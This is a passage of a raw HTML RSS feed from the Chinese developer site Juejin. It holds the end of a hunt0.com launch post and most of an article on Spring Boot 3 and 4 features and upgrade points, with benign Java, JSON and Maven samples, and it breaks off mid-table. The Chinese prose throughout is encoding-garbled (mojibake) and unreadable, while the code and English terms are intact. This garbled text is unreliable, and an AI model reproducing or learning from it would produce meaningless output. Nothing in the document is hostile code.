<li>å¦‚æœä½ æƒ³å‘ç°æ–°äº§å“ï¼šå» <a href="https://link.juejin.cn?target=https%3A%2F%2Fhunt0.com%2Fexplore" target="_blank" title="https://hunt0.com/explore" ref="nofollow noopener noreferrer">Explore</a> æŒ‰åˆ†ç±»/æ ‡ç­¾ç­›é€‰</li>
<li>å¦‚æœä½ æƒ³çœ‹ logo çš„æ•…äº‹ï¼šå» <a href="https://link.juejin.cn?target=https%3A%2F%2Fhunt0.com%2Fabout" target="_blank" title="https://hunt0.com/about" ref="nofollow noopener noreferrer">About</a> çœ‹æ¢¯å­çš„æ¥æº</li>
</ul>
<p>æˆ‘ä»¬ä¼šæŒç»­è¿­ä»£å‘ç°ã€æ¦œå•å’Œç¤¾åŒºæ¿€åŠ±æœºåˆ¶ã€‚Launch something, hunt somethingâ€”â€”ä¹Ÿæ¬¢è¿å‘Šè¯‰æˆ‘ä»¬å“ªé‡Œå¯ä»¥åšå¾—æ›´å¥½ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[SpringBoot 3 å’Œ 4 çš„ç‰ˆæœ¬æ–°ç‰¹æ€§å’Œå‡çº§è¦ç‚¹]]></title>    <link>https://juejin.cn/post/7589920884309311514</link>    <guid>https://juejin.cn/post/7589920884309311514</guid>    <pubDate>2026-01-01T15:14:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589920884309311514" data-draft-id="7589978645135654922" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="SpringBoot 3 å’Œ 4 çš„ç‰ˆæœ¬æ–°ç‰¹æ€§å’Œå‡çº§è¦ç‚¹"/> <meta itemprop="keywords" content="åç«¯,Spring Boot,Java"/> <meta itemprop="datePublished" content="2026-01-01T15:14:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¸€çº¿å¤§ç "/> <meta itemprop="url" content="https://juejin.cn/user/3280598429340984"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            SpringBoot 3 å’Œ 4 çš„ç‰ˆæœ¬æ–°ç‰¹æ€§å’Œå‡çº§è¦ç‚¹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3280598429340984/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¸€çº¿å¤§ç 
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T15:14:13.000Z" title="Thu Jan 01 2026 15:14:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><h2 data-id="heading-0">1. Spring Boot 3.0</h2>
<p>Spring Boot 3.0 æ˜¯ä¸€æ¬¡é‡å¤§çš„æ¡†æ¶æ¢ä»£ï¼Œå¸¦æ¥äº†è®¸å¤šé¢å‘æœªæ¥çš„æ–°ç‰¹æ€§ã€‚ä¸ºäº†å¿«é€ŸæŠŠæ¡æ ¸å¿ƒå˜åŒ–ï¼Œæˆ‘å°†å…¶ä¸»è¦ç‰¹æ€§ã€å…³é”®å˜åŒ–å’Œåº”ç”¨ä»·å€¼æ¢³ç†ä¸ºä¸‹è¡¨ï¼š</p>





















































<table><thead><tr><th align="left">ç‰¹æ€§ç±»åˆ«</th><th align="left">æ ¸å¿ƒç‰¹æ€§</th><th align="left">å…³é”®å˜åŒ– / ç®€è¦è¯´æ˜</th><th align="left">æ ¸å¿ƒä»·å€¼ä¸å½±å“</th></tr></thead><tbody><tr><td align="left"><strong>åŸºç¡€ä¸æ¶æ„</strong></td><td align="left"><strong>Java 17+ åŸºçº¿</strong></td><td align="left">å¼ºåˆ¶è¦æ±‚ Java 17 æˆ–æ›´é«˜ç‰ˆæœ¬ã€‚</td><td align="left">åˆ©ç”¨ç°ä»£Javaç‰¹æ€§ï¼ˆå¦‚<strong>è®°å½•ç±»</strong>ã€<strong>å¯†å°ç±»</strong>ï¼‰ï¼Œæ¨åŠ¨ç”Ÿæ€å‡çº§ã€‚</td></tr><tr><td align="left"/><td align="left"><strong>Jakarta EE 9+</strong></td><td align="left">åŒ…å‘½åç©ºé—´ä» <code>javax.*</code> è¿ç§»è‡³ <code>jakarta.*</code>ã€‚</td><td align="left">é€‚é…ä¼ä¸šçº§Javaæ–°æ ‡å‡†ï¼Œæ˜¯å‡çº§ä¸­æœ€å¸¸è§çš„ä»£ç ä¿®æ”¹ç‚¹ã€‚</td></tr><tr><td align="left"><strong>äº‘åŸç”Ÿä¸æ€§èƒ½</strong></td><td align="left"><strong>GraalVM åŸç”Ÿé•œåƒ</strong></td><td align="left">é›†æˆ AOT ç¼–è¯‘ï¼Œå¯å°†åº”ç”¨ç¼–è¯‘ä¸ºæœ¬åœ°å¯æ‰§è¡Œæ–‡ä»¶ã€‚</td><td align="left">å®ç°æ¯«ç§’çº§å¯åŠ¨ã€æ›´ä½å†…å­˜å ç”¨ï¼Œä¸º Serverless å’Œå®¹å™¨åŒ–å¸¦æ¥é©å‘½æ€§ä¼˜åŠ¿ã€‚</td></tr><tr><td align="left"/><td align="left"><strong>å¢å¼ºå¯è§‚æµ‹æ€§</strong></td><td align="left">é€šè¿‡ <strong>Micrometer</strong> æä¾›æ›´å®Œå–„çš„æŒ‡æ ‡ã€è¿½è¸ªå’Œç›‘æ§é›†æˆã€‚</td><td align="left">å¼€ç®±å³ç”¨åœ°æ„å»ºå¯è§‚æµ‹æ€§ä½“ç³»ï¼Œæ˜¯å¾®æœåŠ¡è¿ç»´çš„åˆšéœ€ã€‚</td></tr><tr><td align="left"><strong>å¼€å‘ä½“éªŒ</strong></td><td align="left"><strong>å£°æ˜å¼HTTPå®¢æˆ·ç«¯ (<code>@HttpExchange</code>)</strong></td><td align="left">é€šè¿‡æ³¨è§£å£°æ˜HTTPæœåŠ¡æ¥å£ï¼Œç±»ä¼¼Feignä½†æ›´è½»é‡ã€‚</td><td align="left">æå¤§ç®€åŒ–æœåŠ¡é—´HTTPè°ƒç”¨ä»£ç ï¼Œç±»å‹å®‰å…¨ï¼Œå­¦ä¹ æˆæœ¬ä½ã€‚</td></tr><tr><td align="left"/><td align="left"><strong>Problem Details API (RFC 7807)</strong></td><td align="left">æä¾›æ ‡å‡†åŒ–çš„HTTP APIé”™è¯¯å“åº”æ ¼å¼ã€‚</td><td align="left">ç”Ÿæˆæœºå™¨å¯è¯»ã€ç»“æ„åŒ–çš„é”™è¯¯ä¿¡æ¯ï¼Œæå‡APIå‹å¥½æ€§ä¸ä¸€è‡´æ€§ã€‚</td></tr><tr><td align="left"/><td align="left"><strong>è‡ªåŠ¨é…ç½®æœºåˆ¶é©æ–°</strong></td><td align="left">ç”¨ <code>META-INF/spring/org.springframework.boot.autoconfigure.AutoConfiguration.imports</code> æ–‡ä»¶æ›¿ä»£æ—§çš„ <code>spring.factories</code>ã€‚</td><td align="left">å®ç°é…ç½®çš„<strong>é™æ€åŠ è½½</strong>ï¼Œæå‡åº”ç”¨å¯åŠ¨é€Ÿåº¦ã€‚</td></tr></tbody></table>
<h3 data-id="heading-1">1.1 æ ¸å¿ƒç‰¹æ€§è¯¦è§£ä¸ç¤ºä¾‹</h3>
<p>ä¸‹é¢ç”¨å…·ä½“ä»£ç å±•ç¤ºå‡ ä¸ªé‡è¦ç‰¹æ€§çš„ç”¨æ³•ã€‚</p>
<h4 data-id="heading-2">1.1.1. å£°æ˜å¼HTTPå®¢æˆ·ç«¯ (<code>@HttpExchange</code>)</h4>
<p>è¿™ä¸ªæ–°ç‰¹æ€§è®©æœåŠ¡é—´è°ƒç”¨åƒå†™<code>Controller</code>ä¸€æ ·ç®€å•ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 1. å£°æ˜æ¥å£ï¼šåƒå®šä¹‰Controllerä¸€æ ·å®šä¹‰è¦è°ƒç”¨çš„è¿œç¨‹æœåŠ¡</span>
<span class="hljs-meta">@HttpExchange(url = "/api/v1", accept = "application/json", contentType = "application/json")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserServiceClient</span> {
    <span class="hljs-meta">@GetExchange("/users/{id}")</span>
    User <span class="hljs-title function_">getUserById</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Long id)</span>;
    
    <span class="hljs-meta">@PostExchange("/users")</span>
    User <span class="hljs-title function_">createUser</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> User user)</span>;
}

<span class="hljs-comment">// 2. é…ç½®Beanï¼šé€šè¿‡å·¥å‚åˆ›å»ºä»£ç†å®ä¾‹</span>
<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ClientConfig</span> {
    <span class="hljs-meta">@Bean</span>
    UserServiceClient <span class="hljs-title function_">userServiceClient</span><span class="hljs-params">(WebClient.Builder builder)</span> {
        <span class="hljs-type">WebClient</span> <span class="hljs-variable">webClient</span> <span class="hljs-operator">=</span> builder.baseUrl(<span class="hljs-string">"http://user-service-host"</span>).build();
        <span class="hljs-keyword">return</span> HttpServiceProxyFactory.builder(WebClientAdapter.forClient(webClient))
                                      .build()
                                      .createClient(UserServiceClient.class);
    }
}

<span class="hljs-comment">// 3. ç›´æ¥ä½¿ç”¨ï¼šåƒæ³¨å…¥æ™®é€šBeanä¸€æ ·æ³¨å…¥å¹¶ä½¿ç”¨</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> UserServiceClient userServiceClient; <span class="hljs-comment">// æ³¨å…¥å£°æ˜çš„å®¢æˆ·ç«¯</span>
    
    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">getOrderWithUser</span><span class="hljs-params">(Long orderId, Long userId)</span> {
        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> userServiceClient.getUserById(userId); <span class="hljs-comment">// ç›´æ¥è°ƒç”¨ï¼Œå¦‚åŒæœ¬åœ°æ–¹æ³•</span>
        <span class="hljs-comment">// ... å¤„ç†è®¢å•é€»è¾‘</span>
        <span class="hljs-keyword">return</span> order;
    }
}
</code></pre>
<p><strong>æ ¸å¿ƒä¼˜åŠ¿</strong>ï¼šå¼ºç±»å‹ã€ä»£ç ç®€æ´ã€å‡å°‘æ¨¡æ¿ä»£ç ï¼Œæ— éœ€å…³å¿ƒåº•å±‚HTTPç»†èŠ‚ã€‚</p>
<h4 data-id="heading-3">1.1.2. æ ‡å‡†åŒ–çš„é”™è¯¯å“åº” (RFC 7807)</h4>
<p>Spring Boot 3.0 ç°åœ¨æ”¯æŒç”Ÿæˆç¬¦åˆè¡Œä¸šæ ‡å‡†çš„é”™è¯¯å“åº”ä½“ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å½“æŠ›å‡ºå¼‚å¸¸æ—¶ï¼ŒSpring Boot 3.0 é»˜è®¤å¯ä»¥ç”Ÿæˆå¦‚ä¸‹ç»“æ„çš„JSONå“åº”</span>
<span class="hljs-comment">// ä¼ ç»Ÿçš„è‡ªå®šä¹‰é”™è¯¯æ ¼å¼ï¼š{"message": "ç”¨æˆ·ä¸å­˜åœ¨", "error": "Not Found"}</span>
<span class="hljs-comment">// æ–°çš„æ ‡å‡†Problem Detailæ ¼å¼ï¼š</span>
{
    <span class="hljs-string">"type"</span>: <span class="hljs-string">"about:blank"</span>,
    <span class="hljs-string">"title"</span>: <span class="hljs-string">"Not Found"</span>,
    <span class="hljs-string">"status"</span>: <span class="hljs-number">404</span>,
    <span class="hljs-string">"detail"</span>: <span class="hljs-string">"ç”¨æˆ·IDä¸º123çš„ç”¨æˆ·ä¸å­˜åœ¨"</span>,
    <span class="hljs-string">"instance"</span>: <span class="hljs-string">"/users/123"</span>
}
</code></pre>
<p><strong>æ ¸å¿ƒä¼˜åŠ¿</strong>ï¼šæä¾›ç»Ÿä¸€ã€æœºå™¨å¯è¯»çš„é”™è¯¯æ ¼å¼ï¼Œä¾¿äºAPIæ¶ˆè´¹è€…ï¼ˆå°¤å…¶æ˜¯å‰ç«¯ï¼‰è¿›è¡Œæ ‡å‡†åŒ–å¤„ç†ã€‚</p>
<h4 data-id="heading-4">1.1.3. åˆ©ç”¨ç°ä»£Javaç‰¹æ€§ï¼ˆJava 17+ï¼‰</h4>
<p>å‡çº§åˆ°Java 17åŸºçº¿åï¼Œä½ å¯ä»¥åœ¨ä»£ç ä¸­å……åˆ†åˆ©ç”¨æ–°è¯­æ³•ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä½¿ç”¨è®°å½•ç±» (Records) ä½œä¸ºDTOæˆ–å€¼å¯¹è±¡ï¼šè‡ªåŠ¨ç”Ÿæˆæ„é€ å™¨ã€getterã€equalsã€hashCodeå’ŒtoString</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">record</span> <span class="hljs-title class_">UserDTO</span><span class="hljs-params">(Long id, String name, String email)</span> {} <span class="hljs-comment">// ä¸€è¡Œé¡¶è¿‡å»å‡ åè¡Œ</span>

<span class="hljs-comment">// ä½¿ç”¨å¯†å°ç±» (Sealed Classes) ç²¾ç¡®æ§åˆ¶ç»§æ‰¿å±‚æ¬¡ï¼Œå¢å¼ºé¢†åŸŸæ¨¡å‹å®‰å…¨æ€§</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">sealed</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">PaymentResult</span> <span class="hljs-keyword">permits</span> PaymentSuccess, PaymentFailed {
    <span class="hljs-comment">// åªå…è®¸è¿™ä¸¤ä¸ªç±»å®ç°æ­¤æ¥å£</span>
}
<span class="hljs-keyword">public</span> <span class="hljs-keyword">record</span> <span class="hljs-title class_">PaymentSuccess</span><span class="hljs-params">(String transactionId)</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">PaymentResult</span> {}
<span class="hljs-keyword">public</span> <span class="hljs-keyword">record</span> <span class="hljs-title class_">PaymentFailed</span><span class="hljs-params">(String errorCode)</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">PaymentResult</span> {}
</code></pre>
<p><strong>æ ¸å¿ƒä¼˜åŠ¿</strong>ï¼šä»£ç æ›´ç®€æ´ã€æ„å›¾æ›´æ˜ç¡®ã€æ›´å®‰å…¨ã€‚</p>
<h4 data-id="heading-5">1.1.4. é¢å‘åŸç”Ÿç¼–è¯‘ (GraalVM Native Image)</h4>
<p>è¿™æ˜¯è¿ˆå‘äº‘åŸç”Ÿæè‡´æ€§èƒ½çš„å…³é”®ç‰¹æ€§ã€‚</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- åœ¨pom.xmlä¸­ï¼Œä½¿ç”¨Spring Bootæ’ä»¶å³å¯è½»æ¾æ„å»ºåŸç”Ÿé•œåƒ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.graalvm.buildtools<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>native-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä½¿ç”¨Mavenå‘½ä»¤ç¼–è¯‘æˆæœ¬åœ°å¯æ‰§è¡Œæ–‡ä»¶</span>
mvn -Pnative native:compile
<span class="hljs-comment"># ç¼–è¯‘åç”Ÿæˆä¸€ä¸ªç‹¬ç«‹çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆå¦‚`myapp`ï¼‰ï¼Œå¯ä»¥ç›´æ¥è¿è¡Œ</span>
./target/myapp
</code></pre>
<p><strong>æ ¸å¿ƒä¼˜åŠ¿</strong>ï¼šåº”ç”¨å¯åŠ¨é€Ÿåº¦ä»ç§’çº§é™è‡³<strong>æ¯«ç§’çº§</strong>ï¼Œå†…å­˜å ç”¨å¤§å¹…é™ä½ï¼Œéå¸¸é€‚åˆ<strong>Serverless</strong>å’Œ<strong>é«˜å¯†åº¦å®¹å™¨éƒ¨ç½²</strong>åœºæ™¯ã€‚</p>
<h3 data-id="heading-6">1.2. è¿ç§»ä¸å‡çº§æ ¸å¿ƒè¦ç‚¹</h3>
<ul>
<li><strong>é¦–è¦å‰æ</strong>ï¼šç¡®ä¿ä½ çš„JDKç‰ˆæœ¬ä¸º <strong>17</strong> æˆ–æ›´é«˜ã€‚</li>
<li><strong>æœ€ç¹ççš„æ”¹åŠ¨</strong>ï¼šå°†ä»£ç ä¸­æ‰€æœ‰<code>javax.*</code>çš„å¯¼å…¥ï¼ˆå¦‚<code>javax.servlet</code>, <code>javax.persistence</code>ï¼‰æ‰‹åŠ¨æ”¹ä¸º<code>jakarta.*</code>ã€‚è¿™æ˜¯å‡çº§è¿‡ç¨‹ä¸­æœ€å¸¸è§ã€æœ€åŸºç¡€çš„æ”¹åŠ¨ã€‚</li>
<li><strong>ä¾èµ–æ£€æŸ¥</strong>ï¼šç¡®ä¿æ‰€æœ‰ç¬¬ä¸‰æ–¹ä¾èµ–ï¼ˆå°¤å…¶æ˜¯æ•°æ®åº“é©±åŠ¨ã€å„ç§<code>starter</code>ï¼‰éƒ½å·²æä¾›ä¸Spring Boot 3.0ï¼ˆå³Jakarta EE 9+ï¼‰å…¼å®¹çš„ç‰ˆæœ¬ã€‚</li>
<li><strong>æ–°é¡¹ç›®</strong>ï¼šå¼ºçƒˆå»ºè®®ç›´æ¥åŸºäº <strong>Spring Boot 3.x</strong> å’Œ <strong>Java 17+</strong> åˆ›å»ºï¼Œä»å¼€å§‹å°±ç«™åœ¨ç°ä»£æŠ€æœ¯æ ˆä¸Šã€‚</li>
</ul>
<h3 data-id="heading-7">1.3. æ€»ç»“</h3>
<p>æ€»çš„æ¥è¯´ï¼ŒSpring Boot 3.0 æ˜¯ä¸€æ¬¡<strong>é¢å‘æœªæ¥åå¹´</strong>çš„åŸºçŸ³å‡çº§ã€‚å®ƒé€šè¿‡æ‹¥æŠ± <strong>Java 17</strong> å’Œ <strong>Jakarta EE</strong> å¥ å®šäº†ç°ä»£åŸºç¡€ï¼Œé€šè¿‡é›†æˆ <strong>GraalVM åŸç”Ÿç¼–è¯‘</strong> æä¾›äº†äº‘åŸç”Ÿçš„ç»ˆææ€§èƒ½æ–¹æ¡ˆï¼Œå¹¶é€šè¿‡<strong>å£°æ˜å¼HTTPå®¢æˆ·ç«¯</strong>ã€<strong>å¢å¼ºå¯è§‚æµ‹æ€§</strong>ç­‰ç‰¹æ€§æ˜¾è‘—æå‡äº†å¼€å‘ä½“éªŒå’Œè¿ç»´èƒ½åŠ›ã€‚</p>
<h2 data-id="heading-8">2. Spring Boot 4.0</h2>
<p>Spring Boot 4.0æ˜¯ä¸€æ¬¡é‡å¤§çš„ã€é¢å‘æœªæ¥çš„æ›´æ–°ï¼Œå®ƒåŸºäºå…¨æ–°çš„Spring Framework 7.0æ„å»ºï¼Œæ ‡å¿—ç€Springç”Ÿæ€è¿›å…¥äº†æ–°çš„ä¸€ä»£ã€‚ä¸‹è¡¨æ¦‚æ‹¬äº†å®ƒçš„æ ¸å¿ƒæ–°ç‰¹æ€§ï¼Œå¸®åŠ©ä½ å¿«é€ŸæŠŠæ¡è¦ç‚¹ï¼š</p>
<p>Spring Boot 4.0 æ ¸å¿ƒæ–°ç‰¹æ€§ä¸€è§ˆï¼š</p>

































































<table><thead><tr><th align="left">ç‰¹æ€§ç±»åˆ«</th><th align="left">æ ¸å¿ƒç‰¹æ€§</th><th align="left">ç®€è¦è¯´æ˜ä¸å½±å“</th></tr></thead><tbody><tr><td align="left"><strong>å¹³å°ä¸æ¶æ„</strong></td><td align="left"><strong>Java 17+ åŸºçº¿</strong></td><td align="left">å¼ºåˆ¶è¦æ±‚ï¼Œä»¥åˆ©ç”¨ç°ä»£Javaç‰¹æ€§ï¼ˆå¦‚è®°å½•ç±»ã€å¯†å°ç±»ï¼‰ã€‚</td></tr><tr><td align="left"/><td align="left"><strong>å…¨é¢æ”¯æŒJakarta EE 11</strong></td><td align="left">åŒ…å‘½åç©ºé—´ä» <code>javax.*</code> å½»åº•è¿ç§»è‡³ <code>jakarta.*</code>ï¼Œæ˜¯å‡çº§ä¸­æœ€å¸¸è§çš„ä»£ç ä¿®æ”¹ç‚¹ã€‚</td></tr><tr><td align="left"/><td align="left"><strong>æ¨¡å—åŒ–æ¶æ„é‡æ„</strong></td><td align="left">Spring Bootè‡ªèº«è¢«æ‹†åˆ†ä¸ºæ•°åä¸ªç‹¬ç«‹æ¨¡å—ï¼ˆå¦‚<code>spring-boot-webmvc</code>ï¼‰ï¼Œæå‡å¯ç»´æŠ¤æ€§å’Œæ„å»ºæ•ˆç‡ã€‚</td></tr><tr><td align="left"><strong>å¼€å‘æ•ˆç‡ä¸API</strong></td><td align="left"><strong>åŸç”ŸAPIç‰ˆæœ¬æ§åˆ¶</strong></td><td align="left">åœ¨ <code>@RequestMapping</code> ç­‰æ³¨è§£ä¸­ç›´æ¥ä½¿ç”¨ <code>version</code> å±æ€§ç®¡ç†å¤šç‰ˆæœ¬APIï¼Œæ— éœ€ç¬¬ä¸‰æ–¹åº“ã€‚</td></tr><tr><td align="left"/><td align="left"><strong>æ–°çš„é…ç½®æ¨¡å‹ï¼šBeanRegistrar</strong></td><td align="left">å¼•å…¥æ›´çµæ´»ã€æ›´å¼ºå¤§çš„ <code>BeanRegistrar</code> æ¥å£ï¼Œç”¨äºç¼–ç¨‹å¼ã€æ‰¹é‡æ³¨å†ŒBeanã€‚</td></tr><tr><td align="left"/><td align="left"><strong>å£°æ˜å¼HTTPå®¢æˆ·ç«¯</strong></td><td align="left">é€šè¿‡ <code>@HttpExchange</code> ç­‰æ³¨è§£å£°æ˜HTTPæœåŠ¡æ¥å£ï¼ˆåœ¨Spring Boot 3ä¸­å¼•å…¥ï¼‰ï¼Œåœ¨4.xä¸­å¾—åˆ°å·©å›ºå’Œå¢å¼ºã€‚</td></tr><tr><td align="left"/><td align="left"><strong>å¢å¼ºçš„ç©ºå®‰å…¨(Null Safety)æ”¯æŒ</strong></td><td align="left">é‡‡ç”¨ <strong>JSpecify</strong> æ³¨è§£ï¼ˆå¦‚ <code>@NonNull</code>, <code>@Nullable</code>ï¼‰ï¼Œæä¾›è·¨å·¥å…·çš„æ ‡å‡†ç©ºå®‰å…¨å¥‘çº¦ï¼Œå‡å°‘ç©ºæŒ‡é’ˆå¼‚å¸¸ã€‚</td></tr><tr><td align="left"><strong>äº‘åŸç”Ÿä¸æ€§èƒ½</strong></td><td align="left"><strong>ç”Ÿäº§çº§GraalVMåŸç”Ÿé•œåƒæ”¯æŒ</strong></td><td align="left">å°†AOTç¼–è¯‘å’ŒåŸç”Ÿé•œåƒæ”¯æŒä»å®éªŒç‰¹æ€§å‡çº§ä¸ºç”Ÿäº§å°±ç»ªï¼Œå®ç°<strong>æ¯«ç§’çº§å¯åŠ¨</strong>å’Œ<strong>å¤§å¹…é™ä½å†…å­˜å ç”¨</strong>ã€‚</td></tr><tr><td align="left"/><td align="left"><strong>ä¼˜åŒ–çš„é«˜å¹¶å‘æ”¯æŒ</strong></td><td 